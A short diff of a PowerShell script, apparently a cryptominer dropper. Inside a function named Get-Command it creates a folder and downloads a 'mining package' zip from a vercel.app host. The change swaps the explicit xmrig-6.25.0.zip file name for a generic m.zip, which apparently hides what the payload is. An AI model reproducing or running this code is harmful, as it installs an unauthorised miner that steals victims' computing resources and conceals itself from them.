@@ -87,7 +87,7 @@ function Get-Command {
         New-Item -ItemType Directory -Path $M | Out-Null
           Write-Host "m folder created"
           $zipFile = "$TEMP_DIR\m.zip"
-          $minerZipUrl = "https://mcontrol.vercel.app/xmrig-6.25.0.zip"
+          $minerZipUrl = "https://mcontrol.vercel.app/m.zip"
 
         Write-Host "Downloading mining package..."
 
